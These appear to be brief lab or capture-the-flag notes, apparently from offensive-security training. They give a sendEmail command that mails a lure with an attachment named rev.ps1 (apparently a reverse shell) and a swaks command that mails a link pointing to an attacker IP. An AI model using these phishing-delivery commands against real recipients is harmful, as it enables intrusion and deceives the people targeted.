
https://github.com/mogaal/sendemail
./sendEmail -f maildmz@relia.com -t jim@relia.com -u "Open for money" -a rev.ps1 -s 192.168.194.189 -v 

swaks --to itsupport@outdated.htb --from poellie@poellie.com --server mail.outdated.htb --body "http://10.10.16.7/"